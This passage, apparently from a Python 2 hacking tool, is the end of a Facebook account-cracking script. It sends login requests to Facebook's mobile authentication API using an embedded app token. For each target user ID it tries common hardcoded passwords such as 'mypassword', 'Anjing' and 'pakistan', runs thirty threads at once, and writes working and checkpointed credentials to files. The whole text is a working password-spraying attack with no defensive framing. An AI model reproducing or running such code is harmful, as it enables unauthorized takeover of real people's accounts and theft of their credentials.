                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass16 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass16 + '\n' + '\n'
                            okb = open('save/successfull.txt', 'a')
                            okb.write(k + c + user + '|' + pass16 + '\n')
                            okb.close()
                            oks.append(c + user + pass16)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass16 + '\n'
                            cps = open('save/checkpoint.txt', 'a')
                            cps.write(k + c + user + '|' + pass16 + '\n')
                            cps.close()
                            cpb.append(c + user + pass16)
                            pass17 = 'mypassword'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass17 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass17 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass17 + '\n')
                okb.close()
                oks.append(c + user + pass17)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass17 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass17 + '\n')
                cps.close()
                cpb.append(c + user + pass17)
            else:
                pass18 = 'Bangsat'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass18 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass18 + '\n' + '\n'
                    okb = open('save/successfull.txt', 'a')
                    okb.write(k + c + user + '|' + pass18 + '\n')
                    okb.close()
                    oks.append(c + user + pass18)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass18 + '\n'
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k + c + user + '|' + pass18 + '\n')
                    cps.close()
                    cpb.append(c + user + pass18)
                else:
                    pass19 = 'Anjing'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass19 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass19 + '\n' + '\n'
                        okb = open('save/successfull.txt', 'a')
                        okb.write(k + c + user + '|' + pass19 + '\n')
                        okb.close()
                        oks.append(c + user + pass19)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass19 + '\n'
                        cps = open('save/checkpoint.txt', 'a')
                        cps.write(k + c + user + '|' + pass19 + '\n')
                        cps.close()
                        cpb.append(c + user + pass19)
                    else:
                        pass20 = 'pakistan'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass20 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;97m[\x1b[1;92mOK\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass20 + '\n' + '\n'
                            okb = open('save/successfull.txt', 'a')
                            okb.write(k + c + user + '|' + pass20 + '\n')
                            okb.close()
                            oks.append(c + user + pass20)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m]\x1b[1;97m  ' + k + c + user + '\x1b[1;94m|\x1b[1;97m' + pass20 + '\n'
                            cps = open('save/checkpoint.txt', 'a')
                            cps.write(k + c + user + '|' + pass20 + '\n')
                            cps.close()
                            cpb.append(c + user + pass20)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;94m──────────────────────────────────────────────────'
    print '\x1b[1;97m[\x1b[1;92m•\x1b[1;97m] PROCESS HAS BEEN COMPLETED....'
    print '\x1b[1;97m[\x1b[1;92m•\x1b[1;97m] TOTAL \x1b[1;92mOK\x1b[1;91m/\x1b[1;93mCP \x1b[1;91m:\x1b[1;92m ' + str(len(oks)) + '\x1b[1;91m/\x1b[1;93m' + str(len(cpb))
    print '\x1b[1;97m[\x1b[1;92m•\x1b[1;97m] CP FILE HAS BEEN SAVED : save/checkpoint.txt'
    raw_input('\n\x1b[1;94m[ \x1b[1;97mPRESS ENTER TO GO BACK \x1b[1;94m]')
    os.system('python2 lib/ngentod.py')


if __name__ == '__main__':
    menu()
